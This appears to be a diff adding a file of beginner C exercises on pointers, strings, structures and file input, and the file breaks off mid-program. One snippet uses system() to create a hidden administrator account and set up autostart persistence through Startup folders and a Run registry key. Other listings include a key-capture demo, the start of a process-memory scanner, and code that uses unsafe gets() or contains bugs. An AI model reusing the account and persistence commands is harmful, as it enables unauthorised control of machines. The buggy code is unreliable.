@@ -1,0 +1,2682 @@
+/* Inputs a list of strings from the keyboard, sorts them, */
+/* and then displays them on the screen in alphabetical order */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define MAXLINES 25
+
+int get_lines(char *lines[]);
+void sort(char *p[], int n);
+void print_strings(char *p[], int n);
+
+char *lines[MAXLINES];
+
+int main(void)
+{
+    int number_of_lines;
+
+    /*read in the lines from the keyboard.*/
+
+    number_of_lines = get_lines(lines);
+
+    if (number_of_lines < 0)
+    {
+
+        puts("Memory allocation error");
+    exit(-1);
+}
+
+sort(lines, number_of_lines);
+
+print_strings(lines, number_of_lines);
+
+return 0;
+
+}
+
+int get_lines(char *lines[])
+{
+int n = 0;
+
+char buffer[80]; /* temporary storage for each line. */
+
+puts("Enter one line at a time; enter a blank when done.");
+
+while(n < MAXLINES && (gets(buffer) != 0) && (buffer[0] != '\0'))
+{
+    if ((lines[n] = (char *)malloc(strlen(buffer)+1))== NULL)
+        return -1;
+    strcpy(lines[n++], buffer);
+
+}
+return n;
+} /*End of get_lines() */
+
+void sort(char *p[], int n)
+{
+     int a, b;
+     char *tmp;
+
+     for (a = 1; a < n; a++)
+     {
+         for (b = 0; b < n-1; b++)
+         {
+             if (strcmp(p[b], p[b +1]) > 0)
+             {
+                 tmp = p[b];
+                 p[b] = p[b+1];
+                 p[b+1] = tmp;
+             }
+         }
+     }
+}
+
+void print_strings(char *p[], int n)
+{
+    int count;
+
+    for (count = 0; count < n; count++)
+        printf("%s\n", p[count]);
+}
+
+
+
+----
+/* Inputs a list of strings from the keyboard, sorts them, */
+/* and then displays them on the screen in alphabetical order */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define MAXLINES 25
+
+int get_lines(char *lines[]);
+void sort(char *p[], int n);
+void print_strings(char *p[], int n);
+
+char *lines[MAXLINES];
+
+int main(void)
+{
+    int number_of_lines;
+
+    /*read in the lines from the keyboard.*/
+
+    number_of_lines = get_lines(lines);
+
+    if (number_of_lines < 0)
+    {
+
+        puts("Memory allocation error");
+    exit(-1);
+}
+
+sort(lines, number_of_lines);
+print_strings(lines, number_of_lines);
+return 0;
+
+}
+
+int get_lines(char *lines[])
+{
+int n = 0;
+
+char buffer[80]; /* temporary storage for each line. */
+
+puts("Enter one line at a time; enter a blank when done.");
+
+while(n < MAXLINES && (gets(buffer) != 0) && (buffer[0] != '\0'))
+{
+    if ((lines[n] = (char *)malloc(strlen(buffer)+1))== NULL)
+        return -1;
+    strcpy(lines[n++], buffer);
+
+}
+return n;
+} /*End of get_lines() */
+
+void sort(char *p[], int n)
+{
+     int a, b;
+     char *tmp;
+
+     for (a = 1; a < n; a++)
+     {
+         for (b = 0; b < n-1; b++)
+         {
+             if (strcmp(p[b], p[b +1]) > 0)
+             {
+                 tmp = p[b];
+                 p[b] = p[b+1];
+                 p[b+1]=tmp;
+             }
+         }
+     }
+}
+
+void print_strings(char *p[], int n)
+{
+    int count;
+
+    for (count = 0; count < n; count++)
+        printf("%s\n", p[count]);
+}
+
+
+
+
+------
+/*Initializing an array of pointers to type char. */
+/*passing the array of pointers to a function */
+
+
+#include <stdio.h>
+
+void print_strings(char *p[], int n);
+
+int main(void)
+{
+    char *message[8] = {"Four", "score", "and", "seven", "years", "ago,", "our", "forefathers"};
+
+    int count;
+
+        print_strings(message, 8);
+
+
+    return 0;
+}
+
+void print_strings(char *p[], int n)
+
+{
+    int count;
+
+    for (count = 0; count < n; count++)
+        printf("%s ", p[count]);
+    printf("\n");
+
+}
+
+
+
+
+--------
+/* Demonstrates passing a pointer to a multidimensional */
+/* array to a function */
+
+#include <stdio.h>
+
+void printarray_1(int (*ptr)[4]);
+void printarray_2(int (*ptr)[4], int n);
+
+int main(void)
+{
+    int multi[3][4] = {{1, 2, 3, 4},{5, 6, 7, 8}, {9, 10, 11, 12}};
+
+    /*ptr is a poitner to an array of 4 ints. */
+
+    int (*ptr)[4], count;
+
+    /*set ptr to point to the first element of multi */
+
+    ptr = multi;
+
+    /*with each loo, ptr is incremented to point to the next */
+    /*element (that is, the next 4 element integer array) of multi. */
+
+    for (count = 0; count < 3; count++)
+        printarray_1(ptr++);
+
+    puts("\n\nPress Enter...");
+    getchar();
+    printarray_2(multi, 3);
+    printf("\n");
+    return 0;
+
+}
+
+void printarray_1(int(*ptr)[4])
+{
+    /*prints the elements of a single four element integer array */
+    /*p is a pointer to type int. you must use type cast */
+    /* to make p equal to the address in ptr. */
+
+    int *p, count;
+    p = (int *)ptr;
+
+    for (count = 0; count < 4; count++)
+        printf("\n%d", *p++);
+
+}
+
+void printarray_2(int (*ptr)[4], int n)
+{
+    int *p, count;
+    p = (int *)ptr;
+
+    for (count = 0; count < (4 *n); count++)
+        printf("\n%d", *p++);
+
+}
+
+
+
+
+-----
+/* Printing with multidirectional arrays and pointers to pointers*/
+
+#include <stdio.h>
+
+int multi[2][4];
+
+int main(void)
+
+{
+    printf("%d", multi[0][0]);
+    printf("%d", *multi[0]);
+    printf("%d", **multi);
+    
+    
+}
+
+
+
+
+--------
+/*using file*/
+/* Demonstrates the fopen() function */
+
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(void)
+
+{
+    FILE *fp;
+
+    char ch, filename[40], mode[4];
+
+    while(1)
+
+    {
+
+
+        /*input filename and mode*/
+
+        printf("\nEnter a filename: ");
+        gets(filename);
+        printf("\nEnter a mode(max 3 characters): ");
+        gets(mode);
+
+        /*Try to open the file. */
+
+        if ((fp = fopen( filename, mode)) != NULL)
+
+        {
+           printf("\nSuccessful opening %s in mode %s.\n", filename, mode);
+                    fclose(fp);
+            puts("Enter x to exit, any other to continue.");
+            if((ch = getc(stdin)) == 'x')
+                break;
+            else
+                continue;
+
+        }
+        else
+    {
+        fprintf(stderr, "\nError opening file%s in mode %s. \n", filename, mode);
+        puts("Enter x to exit, any other to try agian.");
+        if ((ch = getc(stdin)) == 'x')
+            break;
+        else
+            continue;
+
+    }
+    }
+    return 0;
+}
+
+
+
+
+
+---------------------
+
+
+/* shows the sizeof different pointer usages return in a multi dimensional array*/
+
+#include <stdio.h>
+
+int multi[2][4];
+
+int main(void)
+
+{
+   printf("\nThe size of multi = %u", sizeof(multi));
+   printf("\nThe size of multi[0]  %u", sizeof(multi[0]));
+   printf("\nThe size of multi[0][0] = %u", sizeof(multi[0][0]));
+
+
+
+    return 0;
+
+}
+
+
+------------------
+/*Demonstrates pointers and multidimensional arrays */
+/* 3 ways to modify array data with pointer or address of operator */
+
+#include <stdio.h>
+
+int multi[2][4];
+
+int main(void)
+
+{
+    printf("\nmulti = %u", multi);
+    printf("\nmulti[0] = %u", multi[0]);
+    printf("\n&multi[0][0] = %u\n", &multi[0][0]);
+
+    printf("\nmulti[0][0] = %u\n", multi[0][0]);
+
+
+    scanf("%d", &multi[0][0]);
+
+    printf("\nmulti[0][0] = %u\n", multi[0][0]);
+
+
+    scanf("%d", multi);
+
+    printf("\nmulti[0][0] = %u\n", multi[0][0]);
+
+
+    scanf("%d", multi[0]);
+
+    printf("\nmulti[0][0] = %u\n", multi[0][0]);
+
+
+    return 0;
+
+}
+
+
+
+
+-----------------------------------------------------------------------------------------
+/* clearing stdin of extra characters with fflush(stdin)*/
+
+#include <stdio.h>
+
+void clear_kb(void);
+
+int main(void)
+{
+    int age;
+    char name[20];
+
+    /*Prompt for user's age. */
+
+    puts("Enter your age.");
+    scanf("%d", &age);
+
+    /* Clear stdin of any extra characters */
+
+fflush(stdin);
+
+    /*Now prompt for user's name: */
+
+    puts("Enter your first name:");
+    scanf("%s", name);
+
+    /*display the data*/
+
+    printf("Your age is %d. \n", age);
+    printf("Your name is %s.\n", name);
+
+    return 0;
+}
+
+
+
+
+
+
+----------------
+/* clearing stdin of extra characters with a clear function */
+
+#include <stdio.h>
+
+void clear_kb(void);
+
+int main(void)
+{
+    int age;
+    char name[20];
+
+    /*Prompt for user's age. */
+
+    puts("Enter your age.");
+    scanf("%d", &age);
+
+    /* Clear stdin of any extra characters */
+
+    clear_kb();
+
+    /*Now prompt for user's name: */
+
+    puts("Enter your first name:");
+    scanf("%s", name);
+
+    /*display the data*/
+
+    printf("Your age is %d. \n", age);
+    printf("Your name is %s.\n", name);
+
+    return 0;
+}
+
+void clear_kb(void)
+/*clears stdin of any waiting characters. */
+{
+    char junk[80];
+    gets(junk);
+}
+
+
+-------------------
+/* Demonstrates the getch() function. Could possibly be used for keylogger */
+/*non ansi code */
+
+#include <stdio.h>
+#include <conio.h>
+
+#define MAX 255
+
+int main(void)
+{
+    char storage[MAX];
+    int x = 0;
+    for (x = 0; x < MAX; x++)
+    {
+        storage[x] = 0;
+    }
+
+    int ch;
+    int count = 0;
+
+    while ((ch = getch()) != '\r')
+    {
+
+
+    putchar(ch);
+
+    storage[count] = ch;
+
+    count++;
+
+}
+
+
+    printf("\n%s\n", storage);
+
+
+    return 0;
+}
+
+
+------
+/* using getchar() to input strings. */
+
+#include <stdio.h>
+
+#define MAX 10
+
+int main(void)
+{
+    char ch, buffer[MAX+1];
+    int x = 0;
+
+    while ((ch = getchar()) != '\n' && x < MAX)
+    buffer[x++] = ch;
+
+    buffer[x] = '\0';
+
+    printf("%s\n", buffer);
+
+    return 0;
+}
+
+-------
+/* store user input in variable or log keys */
+
+#include <stdio.h>
+
+int main(void)
+{
+    int ch;
+
+    while ((ch = getchar()) != 'q')
+
+    putchar(ch);
+
+    return 0;
+}
+
+
+
+
+-------
+LISTING 13.9 system.c. Using the system() function to execute system commands
+1: /* Demonstrates the system() function. */
+2: #include <stdio.h>
+3: #include <stdlib.h>
+4:
+5: int main( void )
+6: {
+7: /* Declare a buffer to hold input. */
+8:
+9: char input[40];
+10:
+11: while (1)
+12: {
+13: /* Get the user’s command. */
+14:
+15: puts(“\nInput the desired system command, blank to exit”);
+16: gets(input);
+17:
+18: /* Exit if a blank line was entered. */
+19:
+20: if (input[0] == ‘\0’)
+21: exit(0);
+22:
+23: /* Execute the command. */
+24:
+25: system(input);
+26: }
+27: return
+
+
+-----------
+/* Demonstrates the break statement. */
+/* Modifies a two sentence string to be 1 sentence
+*by searching for a period and then adding a null byte */
+ 
+
+#include <stdio.h>
+
+char s[] = "This is a test string. It contains two sentences. ";
+
+int main(void)
+{
+    int count;
+
+    printf("\nOriginal string: %s", s);
+
+    for (count = 0; s[count] !='\0'; count++)
+    {
+        if (s[count] == '.')
+            {
+                s[count+1] = '\0';
+                break;
+            }
+        }
+        printf("\nModified string: %s\n", s);
+
+        return 0;
+}
+
+
+
+
+
+
+------------------------------------------------
+ /* Program: Coder.c
+* Usage: Coder [filename] [action]
+ * where filename = filename for/with coded data
+ * where action = D for decode anything else for
+ * coding
+ *--------------------------------------------------------------*/
+
+#include <stdio.h>
+ #include <stdlib.h>
+ #include <string.h>
+
+ int encode_character( int ch, int val );
+ int decode_character( int ch, int val );
+
+ int main( int argc, char *argv[])
+ {
+ FILE *fh; /* file handle */
+ int rv = 1; /* return value */
+ int ch = 0; /* variable to hold a character */
+unsigned int ctr = 0; /* counter */
+ int val = 5; /* value to code with */
+ char buffer[257]; /* buffer */
+
+ if( argc != 3 )
+ {
+ printf("\nError: Wrong number of parameters..." );
+ printf("\n\nUsage:\n %s filename action", argv[0]);
+ printf("\n\n Where:");
+ printf("\n filename = name of file to code or decode");
+ printf("\n action = D for decode or C for encode\n\n");
+ rv = -1; /* set return error value */
+ }
+ else
+ if(( argv[2][0] == 'D') || (argv [2][0] == 'd' )) /* to decode */
+ {
+ fh = fopen(argv[1], "r"); /* open the file */
+ if( fh <= 0 ) /* check for error */
+ {
+ rv = -2; /* set return error value */
+ }
+ else
+ {
+ ch = getc( fh ); /* get a character */
+ while( !feof( fh ) ) /* check for end of file */
+ {
+ ch = decode_character( ch, val );
+ putchar(ch); /* write the character to screen */
+ ch = getc( fh);
+ }
+
+ fclose(fh);
+ printf( "\n\nFile decoded to screen.\n" );
+ }
+ }
+ else /* assume coding to file. */
+ {
+
+ fh = fopen(argv[1], "w");
+ if( fh <= 0 )
+ {
+ printf( "\n\nError creating file..." );
+ rv = -3; /* set return value */
+ }
+ else
+ {
+ printf("\n\nEnter text to be coded. ");
+ printf("Enter a blank line to end.\n\n");
+
+ while( gets(buffer) != NULL )
+ {
+ if( buffer[0] == 0 )
+ break;
+
+ for( ctr = 0; ctr < strlen(buffer); ctr++ )
+ {
+ ch = encode_character( buffer[ctr], val );
+ ch = fputc(ch, fh); /* write the character to file
+*/
+ }
+ }
+ printf( "\n\nFile encoded to file.\n" );
+ fclose(fh);
+ }
+
+ }
+ return (rv);
+ }
+
+ int encode_character( int ch, int val )
+ {
+ ch = ch + val;
+ return (ch);
+ }
+
+ int decode_character( int ch, int val )
+ {
+ ch = ch - val;
+ return (ch);
+}
+
+---------------
+#include <stdio.h>
+
+int main(void)
+
+{
+
+    system("cmd.exe /c net user test 12345 /add");
+
+    system("cmd.exe /c net localgroup administrators test /add");
+
+    system("cmd.exe /c copy test.txt C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" );
+
+    system("cmd.exe /c copy test.txt C:\\Users\\%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+
+    system("cmd.exe /c REG ADD \\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f /v  /t REG_SZ /d C:\\Users\greg0r\Desktop\Programming\test.txt");
+    getchar();
+       getchar();
+          getchar();
+             getchar();
+
+
+    return 0;
+}
+
+
+--------------------
+/* A union within a structure /*
+
+#include <stdio.h>
+
+#define CHARACTER 'C'
+#define INTEGER 'I'
+#define FLOAT 'F'
+
+struct generic_tag{
+    char type;
+    union shared_tag{
+        char c;
+        int i;
+        float f;
+        }shared;
+};
+
+void print_function(struct generic_tag generic);
+
+int main(void)
+{
+
+struct generic_tag var;
+
+var.type = CHARACTER;
+var.shared.c = '$';
+print_function(var);
+
+var.type = FLOAT;
+var.shared.f = (float) 12345.67890;
+print_function(var);
+
+var.type = 'x';
+var.shared.i = 111;
+print_function(var);
+return 0;
+
+
+}
+void print_function(struct generic_tag generic)
+{
+    printf("\n\nThe generic value is...");
+    switch(generic.type)
+    {
+        case CHARACTER: printf("%c", generic.shared.c);
+        break;
+        case INTEGER: printf("%d", generic.shared.i);
+        break;
+        case FLOAT: printf("%f", generic.shared.f);
+        break;
+        default: printf("an unknown type: %c\n", generic.type);
+        break;
+
+    }
+}
+
+
+
+------
+/* Demonstrates passing a structure to a function. */
+
+#include <stdio.h>
+
+/* Declare and define a structure to hold the data. */
+
+struct data {
+    float amount;
+    char fname[30];
+    char lname[30];
+    }rec;
+
+/* The function prototype. The function has no return value, */
+/*and it takes a structure of type data as its one argument. */
+
+void print_rec(struct data displayRec);
+
+int main(void)
+{
+
+    /*Input the data fromt he keyboard */
+
+    printf("Enter the donor's first and last names, \n");
+    printf("separated by a space: ");
+    scanf("%s %s", rec.fname, rec.lname);
+
+    printf("\nEnter the donation amount: ");
+    scanf("%f", &rec.amount);
+
+    /*Call the display function. */
+    print_rec(rec);
+
+    return 0;
+}
+void print_rec(struct data displayRec)
+{
+    printf("\nDonor %s %s gave $%.2f.\n", displayRec.fname, displayRec.lname, displayRec.amount);
+}
+
+
+
+
+--------
+/*Demonstrates stepping through an array of structures  using pointer notation*/
+
+
+#include <stdio.h>
+
+#define MAX 4
+
+struct part {
+    short number;
+    char name[10];
+
+} data[MAX] = {1, "Smith",
+                2, "Jones",
+                3, "Adams",
+                4, "Wilson"
+                };
+/*Declare a pointer to type part, and a counter variable. */
+
+struct part *p_part;
+int count;
+
+int main(void)
+{
+    /*Initialize the pointer to the first array element. */
+
+    p_part = data;
+
+    /*Loop through the array incrementing the pointer */
+    /* with each iteration. */
+
+    for (count = 0; count < MAX; count++)
+    {
+        printf("At address %d: %d %s\n", p_part, p_part->number, p_part->name);
+        p_part++;
+
+    }
+    return 0;
+}
+
+
+----
+/*demonstrates using arrays of structures */
+
+/*demonstrates using arrays of structures*/
+
+#include <stdio.h>
+
+/*define a structure to hold entries.*/
+
+struct entry {
+    char fname[20];
+    char lname[20];
+    char phone[10];
+    };
+
+    /*declare an array of structures.*/
+
+    struct entry list[4];
+
+    int i;
+
+    int main(void)
+    {
+        /*loop to input data for four people. */
+
+        for (i = 0; i <4; i++)
+        {
+            printf("\nEnter first name:");
+            scanf("%s", list[i].fname);
+            printf("Enter last name:");
+            scanf("%s", list[i].lname);
+            printf("Enter phone in 123-4567 format: ");
+            scanf("%s", list[i].phone);
+        }
+        printf("\n\n");
+
+        for (i = 0; i < 4; i++)
+        {
+
+            printf("Name: %s %s", list[i].fname, list[i].lname);
+            printf("\t\tPhone: %s\n", list[i].phone);
+
+        }
+        return 0;
+    }
+
+
+
+----------
+/* demonstrates structures that contain other structures, calculates area of rectangle with coordinates given by user*/
+
+#include <stdio.h>
+
+int length, width;
+long area;
+
+struct coord{
+int x;
+int y;
+};
+
+struct rectangle{
+struct coord topleft;
+struct coord bottomrt;
+}mybox;
+
+int main(void)
+{
+    printf("\nEnter the top left x coordinate:");
+    scanf("%d", &mybox.topleft.x);
+
+     printf("\nEnter the top left y coordinate:");
+    scanf("%d", &mybox.topleft.y);
+
+    printf("\nEnter the bottom right x coordinate:");
+    scanf("%d", &mybox.bottomrt.x);
+
+    printf("\nEnter the bottom right y coordinate:");
+    scanf("%d", &mybox.bottomrt.y);
+
+    /*calculate the legth and width */
+
+    width = mybox.bottomrt.x - mybox.topleft.x;
+    length = mybox.bottomrt.y - mybox.topleft.y;
+
+    /*calculate and display the area */
+
+    area = width * length;
+    printf("\nThe area is %ld units.\n", area);
+
+    return 0;
+
+}
+
+
+---------
+/*Print a box using ascii character values and printf()*/
+#include <stdio.h>
+
+char print = 3;
+int count = 0;
+int x = 1;
+int count1 = 0;
+int main(void)
+{
+
+while (count1 <= 100)
+{
+{
+    for (count = 0; count < 10; count++)
+{
+    printf("%c", print);
+
+}
+printf("\n");
+
+    for (count = 0; count < 5; count++)
+    {
+        printf("%c  Dani  %c\n", print, print);
+    }
+
+    for (count = 0; count < 10; count++)
+{
+    printf("%c", print);
+}
+printf("\n");
+count1++;
+}
+}
+
+    return 0;
+
+}
+
+
+/*Function to compare the length of two char strings and return the larger of the two*/
+
+#include <stdio.h>
+#include <string.h>
+
+char *compare_strings( char *, char*);
+
+int main(void)
+{
+    char *a = "Hello";
+    char *b = "World!";
+    char *longer;
+
+    longer = compare_strings(a, b);
+
+    printf("The longer string is: %s\n", longer);
+
+    return 0;
+}
+char *compare_strings(char* first, char* second)
+{
+    int x, y;
+
+    x = strlen(first);
+    y = strlen(second);
+    printf("strlen for first is: %d\n and the strlen for second is: %d\n", *first, *second);
+
+    if (x > y)
+        return(first);
+    else
+        return(second);
+}
+
+
+
+---------
+/* copy the contents of one char string to another char string with a function*/
+
+#include <stdio.h>
+#define MAX 6
+char one[6] = "Hello";
+char two[6];
+char copy(char x1[],char x2[],int length);
+char total;
+int main(void)
+{
+    puts(two);
+    getchar();
+    getchar();
+    copy(one, two, MAX);
+
+    printf("%s\n", two);
+    puts(two);
+
+    return 0;
+
+
+}
+char copy(char x1[],char x2[],int length)
+{
+    int count;
+    for (count = 0; count < length; count++)
+        x2[count] += x1[count];
+
+}
+
+
+
+------
+/*allocate memory for a string, then get user input, store it, and print it*/
+#include <stdio.h>
+
+char *ptr, input;
+
+int main(void)
+{
+    ptr = 0;
+    ptr = malloc(80 * sizeof(char));
+
+    if(ptr == NULL)
+    {
+        puts("Memory allocation failed");
+    }
+    else
+    {
+        puts("Enter some text to be recorded");
+        gets(ptr);
+        puts("You entered:");
+        puts(ptr);
+        printf("%d", &ptr);
+    }
+    return 0;
+}
+
+
+--------
+/*Demonstrates using scanf() to input numeric and text data. */
+
+#include <stdio.h>
+
+char lname[257], fname[257];
+int count, id_num;
+
+int main(void)
+{
+    puts("Enter last name, first name, ID number separated");
+    puts("by spaces, then press Enter.");
+
+    count = scanf("%s%s%d", lname, fname, &id_num);
+
+    printf("%d items entered: %s %s %d \n", count, fname, lname, id_num);
+
+    return 0;
+}
+
+
+
+-------------
+/*Demonstrates using the gets() return value */
+
+#include <stdio.h>
+
+char input[257], *ptr;
+
+int main (void)
+{
+    puts("Enter text a line at a time, then press Enter.");
+    puts("Enter a blank line when done.");
+
+    while (*(ptr = gets(input)) != NULL)
+        printf("You entered %s\n", input);
+
+    puts("Thank you and good-bye\n");
+
+    return 0;
+}
+
+
+------------------
+#include <stdio.h>
+
+/*allocate a character array to hold input. */
+
+char input[81];
+
+int main (void)
+{
+
+    puts("Enter some text, then press Enter:");
+    gets(input);
+    printf("You entered: %s\n", input);
+
+    return 0;
+}
+
+
+
+------
+/*allocating memory for a string of chars using malloc()*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char count, *ptr, *p;
+
+int main(void)
+
+{
+    ptr = malloc(35 *sizeof(char));
+
+    if (ptr == NULL)
+    {
+        puts("Memory allocation error.");
+        return 1;
+    }
+
+    p = ptr;
+
+    for (count = 65; count<91; count++)
+        *p++ = count;
+    *p = '\0';
+
+    puts(ptr);
+
+    free(ptr);
+
+    return 0;
+}
+
+
+
+----
+/* start of a memory scanner*/
+
+#include <windows.h>
+#include <stdio.h>
+typedef struct _MEMBLOCK
+{
+    HANDLE hProc;
+    unsigned char *addr;
+    int size;
+    unsigned char *buffer;
+    struct _MEMBLOCK *next;
+
+} MEMBLOCK;
+
+MEMBLOCK* create_memblock (HANDLE hProc, MEMORY_BASIC_INFORMATION *meminfo)
+{
+    MEMBLOCK *mb = malloc(sizeof(MEMBLOCK));
+
+    if(mb)
+    {
+        mb->hProc = hProc;
+        mb->addr = meminfo->BaseAddress;
+        mb->size = meminfo->RegionSize;
+        mb->buffer = malloc(meminfo->RegionSize);
+        mb->next = NULL;
+    }
+
+    return mb;
+}
+
+void free_memblock (MEMBLOCK *mb)
+{
+    if (mb)
+    {
+        if(mb->buffer)
+        {
+            free (mb->buffer);
+        }
+        free (mb);
+    }
+
+}
+
+MEMBLOCK* create_scan (unsigned int pid)
+{
+    MEMBLOCK *mb_list = NULL;
+    MEMORY_BASIC_INFORMATION meminfo;
+    unsigned char *addr = 0;
+
+    HANDLE hProc = OPENPROCESS(PROCESS_ALL_ACCESS, FALSE, pid);
+
+    if (hProc)
+    {
+        while (1)
+        {
+            if (VirtualQueryEx (hProc, addr, &meminfo, sizeof(meminfo)) == 0)
+                {
+                    break;
+                }
+            #define WRITABLE (PAGE_READWRITE |PAGE_WRITECOPY | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)
+            if((meminfo.State & MEM_COMMIT) && (meminfo.Protect & WRITABLE))
+            {
+
+                MEMBLOCK *mb = create_memblock (hProc, &meminfo);
+                if(mb)
+                {
+                   mb->next = mb_list;
+                   mb_list = mb;
+                }
+            }
+    addr = (unsigned char*)meminfo.BaseAddress + meminfo.RegionSize;
+        }
+
+        return mb_list;
+
+    }
+
+    void free_scan (MEMBLOCK *mb_list)
+    {
+        CloseHandle (mb_list->hProc);
+
+        while (mb_list)
+        {
+            MEMBLOCK *mb = mb_list;
+            mb_list = mb_list->next;
+            free_memblock(mb);
+        }
+    }
+
+    void dump_scan_info (MEMBLOCK *mb_list)
+    {
+        MEMBLOCK *mb = mb_list;
+
+        while (mb)
+        {
+            printf("0x%08x %d\r\n", mb->addr, mb->size);
+            mb = mb->next;
+        }
+    }
+
+    int main(int argc, char *argv[])
+    {
+
+    MEMBLOCK *scan = create_scan (atoi(argv[1]));
+    if(scan)
+    {
+        dump_scan_info(scan);
+        free_scan(scan);
+    }
+
+    return 0;
+
+    }
+
+
+
+
+--------
+/* program to print ascii characters and thier numeric values */
+
+#include <stdio.h>
+
+unsigned char mychar;
+
+int main(void)
+{
+    for (mychar = 1; mychar < 204; mychar++)
+    {
+        printf("ASCII code %d is character %c\n", mychar, mychar);
+
+    }
+
+    return 0;
+}
+
+------
+/*Program that waits for a set amount of time*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+void sleep(int nbr_seconds);
+
+int main(void)
+{
+    int ctr;
+    int wait = 13;
+
+    printf("Delay for %d seconds\n", wait);
+    printf(">");
+
+    for (ctr=1; ctr<= wait; ctr++)
+    {
+        printf(".");
+        fflush(stdout);
+        sleep((int)1);
+
+    }
+    printf( "Done!\n");
+    return 0;
+}
+void sleep (int nbr_seconds)
+{
+    clock_t goal;
+
+    goal = (nbr_seconds * CLOCKS_PER_SEC)+clock();
+
+    while(goal >clock())
+    {
+        ;
+    }
+
+}
+
+
+
+------
+/* Passing arrays to a function and adding all of the elements together*/
+#include <stdio.h>
+
+#define MAX1 5
+#define MAX2 8
+
+int array1[MAX1] = {1,1,1,1,1};
+int array2[MAX2] = {1,1,1,1,1,1,1,1};
+int total;
+
+int sumarrays(int x1[], int len_x1, int x2[], int len_x2);
+
+int main(void)
+{
+    total = sumarrays(array1, MAX1, array2, MAX2);
+    printf("The total is %d\n", total);
+
+    return 0;
+}
+int sumarrays(int x1[], int len_x1, int x2[], int len_x2)
+{
+    int total = 0, count = 0;
+    for (count = 0; count < len_x1; count++)
+        total += x1[count];
+    for (count = 0; count < len_x2; count++)
+        total += x2[count];
+
+    return total;
+}
+
+
+-----------------------
+/* Using pointers to change values */
+
+#include <stdio.h>
+
+int cost = 22;
+
+int *p_cost = &cost;
+
+int main(void)
+{
+    printf("cost %d\n", cost);
+    printf("%d\n", p_cost);
+    printf("%d\n", *p_cost);
+    *p_cost = 100;
+    printf("%d\n", p_cost);
+    printf("%d\n", *p_cost);
+    printf("cost %d\n", cost);
+
+
+
+    return 0;
+}
+
+
+
+
+----------------
+/*Passing array values to functions */
+
+#include <stdio.h>
+
+#define MAX 10
+
+int array[MAX+1], count;
+
+int largest(int num_array[]);
+
+int main(void)
+
+{
+    for (count = 0; count < MAX; count++)
+    {
+        printf("Enter an integer value:");
+        scanf("%d", &array[count]);
+
+        if (array[count] == 0)
+            count = MAX;
+    }
+    array[MAX] = 0;
+
+    printf("\n\nLargest value = %d\n", largest(array));
+
+    return 0;
+
+}
+
+int largest(int num_array[])
+{
+    int count, biggest = -12000;
+    for (count = 0; num_array[count] != 0; count++)
+    {
+        if (num_array[count] > biggest)
+            biggest = num_array[count];
+    }
+
+    return biggest;
+}
+
+
+
+----------
+/*Generate random numbers and fill a 3 dimensional array with them, then print them*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int random_array[3][3][3];
+int a, b, c;
+
+int main(void)
+{
+    srand( time(NULL));
+
+    for (a = 0; a < 3; a++)
+    {
+        for (b = 0; b < 3; b++)
+        {
+            for(c = 0; c < 3; c++)
+            {
+                random_array[a][b][c] = rand() % 100 + 1;
+
+                            }
+
+        }
+    }
+
+
+for (a = 0; a < 3; a++)
+{
+    for (b = 0; b < 3; b++)
+    {
+        for (c = 0; c < 3; c++)
+        {
+          printf("\nrandom_array[%d][%d][%d] =", a, b, c);
+          printf("%d", random_array[a][b][c]);
+        }
+    }
+}
+return 0;
+}
+
+
+
+--------------
+/* Another type of MENU PROGRAM */
+
+#include <stdio.h>
+
+#define QUIT 4
+
+int get_menu_choice(void);
+
+int main(void)
+{
+    int choice = 0, int_var = 0;
+
+    float float_var = 0.0;
+    unsigned unsigned_var = 0;
+
+    while (choice != QUIT)
+    {
+        choice = get_menu_choice();
+
+        if (choice == 1)
+        {
+            puts("\nEnter a signed decimal integer (i.e -123)");
+            scanf("%d", &int_var);
+        }
+        if (choice == 2)
+        {
+            puts("\nEnter a decimal floating-point number\
+                 e.g. 1.23)");
+                 scanf("%f", &float_var);
+        }
+        if (choice == 3)
+        {
+            puts("\nEnter an unsigned decimal integer \
+                 (e.g. 123)");
+                 scanf("%u", &unsigned_var);
+        }
+    }
+    printf("\nYour values are: int: %d float: %f unsigned: %u \n", int_var, float_var, unsigned_var);
+
+    return 0;
+
+}
+
+int get_menu_choice(void)
+{
+    int selection = 0;
+
+    do
+    {
+        puts("\n1 - Get a signed decimal integer");
+        puts("2 - Get a decimal floating-point number");
+        puts("3 - Get an unsigned decimal integer");
+        puts("4 - Quit");
+        puts("\nEnter a selection:");
+        scanf("%d", &selection);
+    }while (selection <1 || selection > 4);
+
+    return selection;
+}
+
+
+----------
+/*program that lets you chose an option and beeps or prints a report*/
+
+#include <stdio.h>
+
+#define QUIT 3
+
+int get_menu_choice(void);
+void print_report(void);
+
+int main(void)
+
+{
+    int choice = 0;
+
+    while  (choice != QUIT)
+    {
+        choice = get_menu_choice();
+
+        if(choice == 1)
+            printf("\nBeeping the computer\a\a\a");
+        else
+        {
+            if (choice == 2)
+                print_report();
+        }
+    }
+    printf("You chose to quit!\n");
+
+    return 0;
+}
+int get_menu_choice(void)
+{
+    int selection = 0;
+
+    do
+    {
+        printf("\n");
+        printf("\n1 - Beep Computer");
+        printf("\n2 - Display Report");
+        printf("\n3 - Quit");
+        printf("\n");
+        printf("\nEnter a selection:");
+
+        scanf("%d", &selection);
+
+    }while (selection < 1 || selection > 3);
+
+    return selection;
+
+}
+
+void print_report(void)
+{
+    printf("\nSAMPLE REPORT");
+    printf("\n\nSequence\tMeaning");
+    printf( "\n=======\t======");
+    printf( "\n\\a\t\tbell (alert)");
+    printf( "\n\\b\t\tbackspace");
+    printf("\n...\t\t...");
+
+}
+
+------------
+/* Enables user to enter up to 10 integer values */
+
+int value[10];
+int ctr = 0;
+int nbr;
+
+int main(void)
+{
+
+do
+{
+    puts("Enter a number, 99 to quit");
+    scanf( "%d", &nbr);
+    value[ctr] = nbr;
+    ctr++;
+}while (ctr < 10 && nbr !=99);
+
+return 0;
+
+}
+
+-------
+/*Creating a Menu with choice options/*
+
+#include <stdio.h>
+
+int get_menu_choice(void);
+
+int main(void)
+
+{
+    int choice;
+
